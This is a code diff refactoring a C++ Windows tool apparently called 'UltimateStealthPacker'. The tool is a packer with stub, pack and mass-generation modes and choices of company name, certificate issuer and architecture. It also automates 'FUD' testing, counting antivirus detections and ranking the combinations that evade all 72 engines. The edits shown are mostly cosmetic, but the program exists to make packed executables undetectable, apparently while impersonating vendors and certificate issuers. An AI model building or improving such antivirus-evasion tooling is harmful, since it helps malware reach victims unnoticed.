@@ -40,26 +40,26 @@
 #pragma comment(lib, "advapi32.lib")
 
 // GUI Control IDs
-#define ID_INPUT_PATH 1001
-#define ID_OUTPUT_PATH 1002
-#define ID_BROWSE_INPUT 1003
-#define ID_BROWSE_OUTPUT 1004
-#define ID_CREATE_BUTTON 1005
-#define ID_PROGRESS_BAR 1006
-#define ID_STATUS_TEXT 1007
-#define ID_COMPANY_COMBO 1008
-#define ID_ABOUT_BUTTON 1009
-#define ID_ARCHITECTURE_COMBO 1010
-#define ID_CERTIFICATE_COMBO 1011
+constexpr int ID_INPUT_PATH = 1001;
+constexpr int ID_OUTPUT_PATH = 1002;
+constexpr int ID_BROWSE_INPUT = 1003;
+constexpr int ID_BROWSE_OUTPUT = 1004;
+constexpr int ID_CREATE_BUTTON = 1005;
+constexpr int ID_PROGRESS_BAR = 1006;
+constexpr int ID_STATUS_TEXT = 1007;
+constexpr int ID_COMPANY_COMBO = 1008;
+constexpr int ID_ABOUT_BUTTON = 1009;
+constexpr int ID_ARCHITECTURE_COMBO = 1010;
+constexpr int ID_CERTIFICATE_COMBO = 1011;
 // Add new control IDs
-#define ID_MASS_GENERATE_BUTTON 1012
-#define ID_MASS_COUNT_EDIT 1013
-#define ID_STOP_GENERATION_BUTTON 1014
+constexpr int ID_MASS_GENERATE_BUTTON = 1012;
+constexpr int ID_MASS_COUNT_EDIT = 1013;
+constexpr int ID_STOP_GENERATION_BUTTON = 1014;
 // Add new control IDs for mode selection
-#define ID_MODE_STUB_RADIO 1015
-#define ID_MODE_PACK_RADIO 1016
-#define ID_MODE_MASS_RADIO 1017
-#define ID_MODE_GROUP 1018
+constexpr int ID_MODE_STUB_RADIO = 1015;
+constexpr int ID_MODE_PACK_RADIO = 1016;
+constexpr int ID_MODE_MASS_RADIO = 1017;
+constexpr int ID_MODE_GROUP = 1018;
 
 // Global variables for mass generation
 bool g_massGenerationActive = false;
@@ -1233,7 +1233,7 @@ private:
     
 public:
     struct CompilerResult {
-        bool success;
+        bool success = false;
         std::string errorMessage;
         std::string outputPath;
     };
@@ -1409,7 +1409,7 @@ HWND g_hModeGroup, g_hModeStubRadio, g_hModePackRadio, g_hModeMassRadio;
 UltimateStealthPacker g_packer;
 
 // Mass generation function
-DWORD WINAPI massGenerationThread(LPVOID lpParam) {
+static DWORD WINAPI massGenerationThread(LPVOID lpParam) {
     int totalCount = *(int*)lpParam;
     
     for (int i = 0; i < totalCount && g_massGenerationActive; ++i) {
@@ -1848,7 +1848,7 @@ LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) 
     return 0;
 }
 
-int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+int WINAPI WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPSTR lpCmdLine, _In_ int nCmdShow) {
     // Initialize common controls
     INITCOMMONCONTROLSEX icex;
     icex.dwSize = sizeof(INITCOMMONCONTROLSEX);
@@ -1903,8 +1903,8 @@ private:
         std::string certIssuer;
         std::string architecture;
         std::string hash;
-        bool isFUD;
-        int detectionCount;
+        bool isFUD = false;
+        int detectionCount = 0;
         std::string vtLink;
     };
     
@@ -2055,12 +2055,12 @@ public:
             testResults.push_back(result);
             
             if (result.isFUD) {
-                std::cout << "✅ FUD! (0/" << 72 << " detections)\n";
+                std::cout << "[SUCCESS] FUD! (0/" << 72 << " detections)\n";
             } else {
-                std::cout << "❌ Detected (" << result.detectionCount << "/" << 72 << " detections)\n";
+                std::cout << "[DETECTED] Detected (" << result.detectionCount << "/" << 72 << " detections)\n";
             }
             
-            std::cout << "🔗 " << result.vtLink << "\n\n";
+            std::cout << "[LINK] " << result.vtLink << "\n\n";
             
             // Simulate processing delay
             Sleep(100);
@@ -2071,7 +2071,7 @@ public:
     
     // NEW: Generate comprehensive FUD report
     void generateFUDReport() {
-        std::cout << "\n🎯 AUTOMATED FUD TESTING COMPLETE!\n";
+        std::cout << "\n[COMPLETE] AUTOMATED FUD TESTING COMPLETE!\n";
         std::cout << "=====================================\n\n";
         
         // Count results by company
@@ -2088,7 +2088,7 @@ public:
             }
         }
         
-        std::cout << "📊 COMPANY FUD RANKINGS:\n";
+        std::cout << "[RANKINGS] COMPANY FUD RANKINGS:\n";
         std::cout << "========================\n";
         
         for (const auto& stat : companyStats) {
@@ -2096,20 +2096,20 @@ public:
             int totalCount = stat.second.second;
             double percentage = (double)fudCount / totalCount * 100.0;
             
-            std::cout << "🏢 " << stat.first << "\n";
-            std::cout << "   ✅ FUD: " << fudCount << "/" << totalCount 
+            std::cout << "[COMPANY] " << stat.first << "\n";
+            std::cout << "   [FUD] FUD: " << fudCount << "/" << totalCount 
                      << " (" << std::fixed << std::setprecision(1) << percentage << "%)\n\n";
         }
         
         // Find best combinations
-        std::cout << "🥇 TOP FUD COMBINATIONS:\n";
+        std::cout << "[TOP] TOP FUD COMBINATIONS:\n";
         std::cout << "========================\n";
         
         for (const auto& result : testResults) {
             if (result.isFUD) {
-                std::cout << "✅ " << result.companyName << " + " << result.certIssuer 
+                std::cout << "[SUCCESS] " << result.companyName << " + " << result.certIssuer 
                          << " + " << result.architecture << "\n";
-                std::cout << "   🔗 " << result.vtLink << "\n\n";
+                std::cout << "   [LINK] " << result.vtLink << "\n\n";
             }
         }
         
@@ -2138,7 +2138,7 @@ public:
         fudFile << "}\n";
         fudFile.close();
         
-        std::cout << "💾 FUD database exported to: verified_fud_combinations.txt\n";
-        std::cout << "🔧 Ready to update your packer with verified combinations!\n\n";
+        std::cout << "[EXPORT] FUD database exported to: verified_fud_combinations.txt\n";
+        std::cout << "[READY] Ready to update your packer with verified combinations!\n\n";
     }
 };
